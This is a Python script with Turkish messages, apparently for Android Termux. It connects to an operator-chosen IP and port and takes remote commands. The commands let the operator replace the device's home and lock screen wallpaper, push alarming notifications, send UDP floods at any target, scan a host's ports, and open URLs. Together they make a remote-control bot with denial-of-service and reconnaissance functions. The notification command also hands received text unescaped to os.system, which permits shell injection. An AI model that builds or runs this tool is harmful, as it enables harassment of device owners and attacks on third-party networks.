import socket
import subprocess
import os
import urllib.request
import random

SERVER_IP = input("Modem IP gir: ")
PORT = int(input("Port gir: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((SERVER_IP, PORT))
    s.send("[✓] Baglanti basarili.\n".encode())
except:
    print("[!] Baglanti hatasi.")
    exit()

def arkaplan_degistir(resim_url):
    try:
        urllib.request.urlretrieve(resim_url, "arkaplan.jpg")
        os.system("termux-wallpaper -f arkaplan.jpg")
        os.system("termux-wallpaper -t lock -f arkaplan.jpg")
        s.send("[✓] Ana ve kilit ekrani degistirildi\n".encode())
    except:
        s.send("[!] Arka plan degistirilemedi\n".encode())

def uyari_bildirimi(mesaj):
    os.system(f'termux-notification --title "⚠️ UYARI!" --content "{mesaj}" --priority high')
    s.send("[!] Uyari bildirimi gonderildi\n".encode())

def udp_yolla(ip, port, sayi):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    for _ in range(sayi):
        sock.sendto(bytes, (ip, port))
    s.send("[+] UDP gonderimi tamamlandi\n".encode())

def port_tara(ip, start, end):
    sonuc = ""
    for port in range(start, end+1):
        try:
            tarayici = socket.socket()
            tarayici.settimeout(0.3)
            tarayici.connect((ip, port))
            sonuc += f"[+] Port {port} ACIK\n"
            tarayici.close()
        except:
            pass
    if sonuc.strip() == "":
        sonuc = "[!] Hicbir port acik degil\n"
    s.send(sonuc.encode())

def google_ac():
    os.system("termux-open-url https://www.google.com")
    s.send("[✓] Google acildi\n".encode())

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut.startswith("arkaplan "):
            _, url = komut.split(" ", 1)
            arkaplan_degistir(url)
        elif komut.startswith("uyari "):
            _, mesaj = komut.split(" ", 1)
            uyari_bildirimi(mesaj)
        elif komut.startswith("udp "):
            try:
                _, hedef_ip, hedef_port, paket_sayisi = komut.split(" ")
                udp_yolla(hedef_ip, int(hedef_port), int(paket_sayisi))
            except:
                s.send("[!] Hata: udp komutu\n".encode())
        elif komut.startswith("scan "):
            try:
                _, hedef_ip, bas, son = komut.split(" ")
                port_tara(hedef_ip, int(bas), int(son))
            except:
                s.send("[!] Hata: scan komutu\n".encode())
        elif komut == "google":
            google_ac()
        elif komut == "exit":
            s.close()
            break
        else:
            s.send("[!] Gecersiz komut\n".encode())
    except:
        break
